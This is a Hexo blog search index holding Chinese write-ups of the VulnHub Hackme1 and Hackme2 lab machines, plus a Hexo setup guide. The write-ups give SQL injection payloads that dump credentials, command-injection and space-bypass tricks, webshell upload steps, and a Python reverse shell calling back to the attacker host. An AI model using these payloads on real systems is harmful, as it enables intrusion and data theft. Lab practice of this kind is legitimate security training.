<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>靶机-Hackme2</title>
      <link href="/post/ed54.html"/>
      <url>/post/ed54.html</url>
      
        <content type="html"><![CDATA[<p><strong>备注：</strong>文章是从自己csdn博客上移过来的，图片中可能存在水印的情况</p><h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><p>靶机下载</p><blockquote><p><a href="https://vulnhub.com/entry/hackme-2,618/">hackme: 2 ~ VulnHub</a></p></blockquote><pre class="line-numbers language-none"><code class="language-none">攻击机kali：192.168.12.144靶机：192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><ol><li>主机发现，发现主机<code>ip:192.168.12.163</code><pre class="line-numbers language-none"><code class="language-none">namp 192.168.12.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/ed54/2-1.jpg" class>2.发现端口80，22端口开放；对80端口进行访问</li></ol><img src="/post/ed54/2-2.jpg" class><p>3.对站点目录进行扫描</p><pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.163&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/dab04e25c70b4dc09f395f81921d4dda.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/699a79f592394ef386c760a895ec9194.png" alt="在这里插入图片描述"><br>4.网站指纹识别</p><pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2abef7949fbc4b2d960e5fc3b5e00c32.png" alt="在这里插入图片描述"></p><h1 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3.漏洞挖掘"></a>3.漏洞挖掘</h1><p>1.通过注册登录进入<br><img src="https://img-blog.csdnimg.cn/b2689e6d87914e0cacaa7c3ac50eae13.png" alt="在这里插入图片描述"><br>2.可能存在sql注入，用sqlmap失败，进行手工注入</p><blockquote><p>输入：<br>L   –&gt;返回信息猜测这里存在模糊查询<br>Linux%’ and ‘123’ like ‘1   -&gt;成功返回信息</p></blockquote><p>3.构造payload进行注入，爆破数据库</p><pre class="line-numbers language-none"><code class="language-none">Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database&#x2F;**&#x2F;(),&#39;2&#39;,&#39;3发现数据库：webapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/58dd571c2bc7492496293354ceebcc98.png" alt="在这里插入图片描述"><br>4.继续爆破表名，字段名，字段内的数据</p><pre class="line-numbers language-none"><code class="language-none">表名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#39;webapp字段名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;users字段内数据：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(user),&#39;2&#39;,group_concat(pasword)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;**&#x2F;where&#x2F;**&#x2F;1&#x2F;**&#x2F;like&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/a8490e38ef0d46e696a9c9b148b95118.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/44ebb7713da540c38e5740b4b6bd296c.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/085bd47e98124d619b5d235e2ec41f65.png" alt="在这里插入图片描述"><br>5.根据上面获取的用户密码，利用前面md5破解网站破解密码</p><blockquote><p>用户：superadmin<br>密码：2386acb2cf356944177746fc92523983<br>破解：Uncrackable</p></blockquote><p><img src="https://img-blog.csdnimg.cn/b4b15f3f61214159ad94675b63f60f3f.png" alt="在这里插入图片描述"><br>6.利用破解的密码，进行登录<br><img src="https://img-blog.csdnimg.cn/cbd0c30d659044be93c46ce00119925d.png" alt="在这里插入图片描述"><br>7.进行文件上传漏洞的尝试</p><blockquote><p>直接上传木马文件 —-》失败<br>修改后缀为jpg —&gt;访问失败–蚁剑连接不上<br>上传的jpg，利用bp进行修改后缀，上传显示成功，页面访问失败</p></blockquote><p><img src="https://img-blog.csdnimg.cn/5e50329bbfb14fc9b953d65773c9b1b7.png" alt="在这里插入图片描述"><br>8.尝试命令注入漏洞</p><p><img src="https://img-blog.csdnimg.cn/f3b3f62bf87a432289b76f8ff962866d.png" alt="在这里插入图片描述"><br>9.填写数据，利用bp抓包，修改数据</p><blockquote><p>system(‘ls’)</p></blockquote><p><img src="https://img-blog.csdnimg.cn/e5eaa0318de94f9cad6cbc4fedbec076.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/af27a02846f943b69458203a52fabea8.png" alt="在这里插入图片描述"><br>10.查看文件上传php文件</p><blockquote><p>cat${IFS}welcomeadmin.php<br>文件上传的路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;<br><img src="https://img-blog.csdnimg.cn/4aea0b14fcf44ac681f1c323e9c793f6.png" alt="在这里插入图片描述"></p></blockquote><p>命令执行中空格绕过方法</p><blockquote><p>&lt;   –&gt;   重定向，如cat&lt;flag.php<br>&lt;&gt;       –&gt;   重定向，如cat&lt;&gt;flag.php<br>%09  –&gt;   需要php环境，如cat%09flag.php<br>${IFS} –&gt;   单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –&gt;   后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</p></blockquote><h1 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h1><p>1.结合命令执行漏洞和文件上传漏洞，将前面上传的inj.jpg转换成phin.php文件，再使用蚁剑进行连接</p><blockquote><p>system(‘mv${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;inj.jpg${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;phin.php’)</p></blockquote><p>访问页面<br><img src="https://img-blog.csdnimg.cn/f7499f9506374c5f917dc9387dd16d49.png" alt="在这里插入图片描述"><br>蚁剑进行连接<br><img src="https://img-blog.csdnimg.cn/b1bfda1485f44d758eba09b007f37043.png" alt="在这里插入图片描述"><br>2.利用脚本,通过蚁剑上传执行</p><blockquote><p>import socket,subprocess,os<br>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“192.168.12.144”,8989))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”])</p></blockquote><p>3.kali开启监听</p><blockquote><p>nc -lvvp 8989</p></blockquote><p><img src="https://img-blog.csdnimg.cn/58878aa7e38b4a5595e6ac09966261e4.png" alt="在这里插入图片描述"></p><h1 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h1><p>1.在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件<br><img src="https://img-blog.csdnimg.cn/81c55c6af3994e97b8bdd815c27a1fe4.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机-Hackeme1</title>
      <link href="/post/b990.html"/>
      <url>/post/b990.html</url>
      
        <content type="html"><![CDATA[<p><strong>备注：</strong>文章是从自己csdn博客上移过来的，图片中可能存在水印的情况</p><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>1.1 Hackeme1下载位置</p><blockquote><p><a href="https://vulnhub.com/entry/hackme-1,330/">hackme: 1 ~ VulnHub</a></p></blockquote><p>1.2 环境相关信息</p><pre class="line-numbers language-none"><code class="language-none">kali攻击机：192.168.12.144靶机：192.168.12.162<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>2.1 进行主机发现，发现靶机<code>IP：192.168.12.162</code>,同时开放80端口。</p><pre class="line-numbers language-none"><code class="language-none">nmap 192.168.12.1&#x2F;24arp-scan -l <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/21.png" class><p>2.2 访问靶机的80端口，一个登录页面。</p><img src="/post/b990/2-2.jpg" class><p>2.3 对网站进行目录扫描</p><p>（1）利用dirb工具对网站进行扫描。</p><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.12.162&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/2-3.jpg" class><p>（2）利用dirsearch工具对网站进行扫描</p><pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.162&#x2F;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/2-4.jpg" class><p>（3）利用gobuster工具对网站进行扫描</p><pre class="line-numbers language-none"><code class="language-none">gobuster dir -e -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;192.168.12.162#-w 指定字典；-u 指定网站；-x 指定文件的后缀<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/2-5.jpg" class><h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h3><p>3.1 发现登录页面，进行查看发现可以注册用户</p><img src="/post/b990/3-1.jpg" class><p>3.2 进入注册页面，注册个用户</p><img src="/post/b990/3-2.jpg" class><p>3.3 通过注册的用户进行登录，点击search，发现一些数据。</p><img src="/post/b990/3-3.jpg" class><p>3.4 对搜索框进行sql注入，存在单引号的字符注入。</p><pre class="line-numbers language-none"><code class="language-none">### 输入：Linux OS   &#x2F;&#x2F;正常Linux OS&#39; &#x2F;&#x2F;不正常Linux OS&#39; and 1&#x3D;1 # &#x2F;&#x2F;正常Linux OS&#39; and 1&#x3D;2 # &#x2F;&#x2F;不正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/b990/3-4.jpg" class><img src="/post/b990/3-5.jpg" class><p>3.5 判断字段数，根据判断字段数为3。</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; order by 1#          &#x2F;&#x2F;正常Linux OS&#39; order by 4#         &#x2F;&#x2F;不正常Linux OS&#39; order by 3#         &#x2F;&#x2F;正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/b990/3-6.jpg" class><img src="/post/b990/3-7.jpg" class><p>3.6 判断注入的位置</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 11,22,33#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/3-8.jpg" class><p>3.7 爆破数据库名，用户名，版本号</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select database(),user(),version()#数据库名为：webapphacking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/3-9.jpg" class><p>3.8 爆数据库中的表名</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 1, group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;webapphacking&#39;#表名：books,users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/3-10.jpg" class><p>3.9 爆字段名</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 1, group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/3-11.png" class><p>3.10 爆字段内的信息user\pasword</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select group_concat(user),group_concat(pasword),3 from users#用户：superadmin密码：2386acb2cf356944177746fc92523983<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/b990/3-12.jpg" class><p>3.11 利用md5破解网站对密码进行破解</p><blockquote><p>破解网站：</p><p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p></blockquote><img src="/post/b990/3-13.jpg" class><p>3.12 利用解密的账号密码登录，发现文件上传</p><img src="/post/b990/3-14.jpg" class><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><p>4.1 直接上传木马文件—》成功</p><img src="/post/b990/4-1.jpg" class><p>4.2 访问页面，蚁剑连接</p><img src="/post/b990/4-2.jpg" class><img src="/post/b990/4-3.jpg" class><p>4.3 编写反弹shell的脚本，shell.py，并利用蚁剑上传并执行</p><pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,oss&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.12.144&quot;,8989))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.4 kali攻击机开启 端口监听</p><img src="/post/b990/4-4.jpg" class><p>4.5 执行反弹脚本,kali上接受反弹的shell</p><img src="/post/b990/4-5.jpg" class><img src="/post/b990/4-6.jpg" class><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>5.1 在&#x2F;home&#x2F;legacy路径下发现<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>文件touchmenot，执行二进制文件</p><img src="/post/b990/5-1.jpg" class>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建博客</title>
      <link href="/post/2c1.html"/>
      <url>/post/2c1.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><p>​需要安装两个工具：Git工具和node.js</p><h4 id="1-1-Git工具"><a href="#1-1-Git工具" class="headerlink" title="1.1 Git工具"></a>1.1 Git工具</h4><p>1.1.1 下载地址，我是采用官网下载地址。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Git官网下载：https://git-scm.com/国内镜像下载：https://npm.taobao.org/mirrors/git-for-windows/v2.22.0.windows.1/Git-2.22.0-64-bit.exe国内其他版本下载：https://npm.taobao.org/mirrors/git-for-windows/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/2c1/1.png" class><p>1.1.2 git工具的安装没有特别需要注意的地方，只需要确定好自己想要安装的位置。打开命令行终端，输入下面命令查看是否安装成功。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/2c1/2.png" class><h4 id="1-2-Nodejs安装"><a href="#1-2-Nodejs安装" class="headerlink" title="1.2 Nodejs安装"></a>1.2 Nodejs安装</h4><p>1.2.1 下载地址，我查看教程最好是下载安装包，而不是压缩包</p><pre class="line-numbers language-none"><code class="language-none">官网下载：http:&#x2F;&#x2F;nodejs.cn&#x2F;download&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/2c1/3.png" class><p>1.2.2  Nodejs安装需要注意的点就是需要配置下面的图，将这些环境选择上</p><blockquote><ul><li><code>Node.js runtime</code> ：表示运行环境</li><li><code>npm package manager</code>：表示npm包管理器</li><li><code>online documentation shortcuts</code> ：在线文档快捷方式</li><li><code>Add to PATH</code>：添加到环境变量</li></ul></blockquote><img src="/post/2c1/4.png" class><p>1.2.3 其余的基本上默认下一步就可以，同时可以用下面的命令进行查看安装是否成功。</p><blockquote><p>新版的node安装的同时也是安装npm（nodejs的包管理器）</p></blockquote><pre class="line-numbers language-none"><code class="language-none">node -vnpm -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/2c1/2-3.png" class><p>1.2.4 npm的一些常用命令。</p><pre class="line-numbers language-none"><code class="language-none">npm -v：查看npm安装的版本。npm init：会引导你建立一个package.json文件，包括名称、版本、作者等信息。npm list：查看当前目录下已安装的node包。npm ls：查看当前目录下已安装的node包。npm install moduleNames：安装Node模块到本地目录node_modules下。npm install &lt; name &gt; -g：将包安装到全局环境中。npm install &lt; name &gt; --save：安装的同时，将信息写入package.json中，项目路径中若是有package.json文件时，直接使用npm install方法就能够根据dependencies配置安装全部的依赖包，这样代码提交到git时，就不用提交node_modules这个文件夹了。npm install &lt; name&gt; --save-dev：安装的同时，将信息写入package.json中项目路径中若是有package.json文件时，直接使用npm install方法就能够根据devDependencies配置安装全部的依赖包，这样代码提交到git时，就不用提交node_modules这个文件夹了。npm uninstall moudleName：卸载node模块。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-nodejs环境变量配置"><a href="#1-3-nodejs环境变量配置" class="headerlink" title="1.3 nodejs环境变量配置"></a>1.3 nodejs环境变量配置</h4><p>1.3.1 在nodejs的根目录下创建两个文件夹”node_global“和”node_cache“。</p><p>1.3.2 打开cmd命令行（最好用管理员权限打开，避免报错），执行下面的命令</p><pre class="line-numbers language-none"><code class="language-none">npm config set prefix &quot;node_global的绝对路径&quot;npm config set cache &quot;node_cache的绝对路径&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>1.3.3 配置新建系统环境变量NODE_PATH以及将其写到path之中</p><img src="/post/2c1/3-2.png" class><img src="/post/2c1/3-3.png" class><p>1.3.4 npm安装模块默认镜像源是国外，设置成国内镜像源</p><pre class="line-numbers language-none"><code class="language-none">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​这里有个我认为的坑点，就是下载cnpm代替默认的npm，但是后面安装模块都是npm，没有必要下cnpm。</p><pre class="line-numbers language-none"><code class="language-none">cnpm下载：npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npmmirror.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4-Git工具和Nodejs安装参考文章"><a href="#1-4-Git工具和Nodejs安装参考文章" class="headerlink" title="1.4 Git工具和Nodejs安装参考文章"></a>1.4 Git工具和Nodejs安装参考文章</h4><blockquote><p><a href="https://blog.csdn.net/weixin_44893902/article/details/121788104?ops_request_misc=%7B%22request_id%22:%22168769282016782425191134%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168769282016782425191134&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121788104-null-null.142%5Ev88%5Ekoosearch_v1,239%5Ev2%5Einsert_chatgpt&utm_term=nodejs%E5%AE%89%E8%A3%85%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE&spm=1018.2226.3001.4187">(84条消息) node.js安装及环境配置超详细教程【Windows系统安装包方式】_node安装配置_明金同学的博客-CSDN博客</a></p><p><a href="https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-an-zhuang-hexo-bo-ke">一键安装hexo博客 - hexo-script使用文档 (gitbook.io)</a></p></blockquote><h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><p>1.开始的教程缺少环境配置（上面的1.3），nodejs的一些环境配置没有完全</p><p>解决方法：找了一篇其他人博客解决</p><h3 id="2-Hexo安装和配置出现的问题"><a href="#2-Hexo安装和配置出现的问题" class="headerlink" title="2.Hexo安装和配置出现的问题"></a>2.Hexo安装和配置出现的问题</h3><h4 id="2-1-Hexo安装"><a href="#2-1-Hexo安装" class="headerlink" title="2.1 Hexo安装"></a>2.1 Hexo安装</h4><p>2.1.1 前面环境安装后，新建一个文件夹专门用来写博客相关文件的文件夹，在这个文件夹下打开前面安装的git(在文件夹下右键打开 git bash)，输入下面的命令进行安装。</p><pre class="line-numbers language-none"><code class="language-none">npm install -g hexo-clihexo -v &#x2F;&#x2F;查看安装是否成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><u>这里我出现问题：</u></p><p>   （1）发现输入hexo -v后没成功回显，开始以为没成功，后来发现要配置一下它的环境变量。</p><pre class="line-numbers language-none"><code class="language-none">### 在path中添加下面的路径，你的node_global路径D:\blog\nodejs\node_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​（2）有些文章要去github上下install.sh的工具来下hexo—-&gt;可是我没成功就采用上面的方法。</p><p>2.1.2 初始化hexo,去你准备存放博客相关文件的文件夹下</p><pre class="line-numbers language-none"><code class="language-none">hexo init <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.1.3 hexo的一些简单命令</p><pre class="line-numbers language-none"><code class="language-none">hexo g&#x2F;&#x2F;将写好的文件进行打包hexo s&#x2F;&#x2F;本地开启web服务，查看你当前搭建的博客并进行调整hexo clean&#x2F;&#x2F;清除已经打包好的文件hexo new post 文件名&#x2F;&#x2F;创建新文章hexo new page 页面名&#x2F;&#x2F;创建新页面hexo d&#x2F;&#x2F;将本地弄好的博客上传到github上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><blockquote><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-82729029-blog-121901433.235%5Ev35%5Epc_relevant_anti_vip&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-82729029-blog-121901433.235%5Ev35%5Epc_relevant_anti_vip&utm_relevant_index=2">(84条消息) hexo史上最全搭建教程_zjufangzh的博客-CSDN博客</a></p></blockquote><h3 id="3-博客简单配置和上传"><a href="#3-博客简单配置和上传" class="headerlink" title="3. 博客简单配置和上传"></a>3. 博客简单配置和上传</h3><p>3.1 需要注意的点：创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名</p><p>3.2 配置文件 <code>_config.yml</code>文件如下</p><pre class="line-numbers language-none"><code class="language-none">deploy:  type: git  repo: 你创建的仓库地址.git&#x2F;&#x2F;例如：https:&#x2F;&#x2F;github.com&#x2F;Liduan0&#x2F;Liduan0.github.io。git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3.3 安装部署命令</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.4 使用前面的hexo基本命令进行文章的部署</p><pre class="line-numbers language-none"><code class="language-none">hexo c &#x2F;&#x2F;清除打包好的文件hexo g &#x2F;&#x2F;重新打包文件，生成静态文章hexo d&#x2F;&#x2F;部署文章上去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>参考文章</p><blockquote><p>[(84条消息) hexo史上最全搭建教程_zjufangzh的博客-CSDN博客](</p></blockquote><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>基本上一个简单博客搭建完成，后续的模板配置，不同模板配置都不一样需要自己根据文档进行配置。但是这里写下我配置模板过程中的一些问题和解决方法提供给需要的人进行参考。</p><p><strong>问题描述</strong>：配置都是按照模板上的文档进行配置，但是出现找不到页面的情况。</p><p>网上文章分析原因：</p><p>（1）配置不全导致无法找到页面；</p><p>（2）配置出错导致无法找到页面；</p><p>（3）多刷新几次就会出来。</p><p><strong>解决方法</strong>：我专门去生成静态文件的目录下，即文件夹【public】查看是否有相应的页面，都是存在的，刷新n次后还是没出来。后来直接将配置的js文件换个名字，重新调用成新命名的文件才将页面弄出来。</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
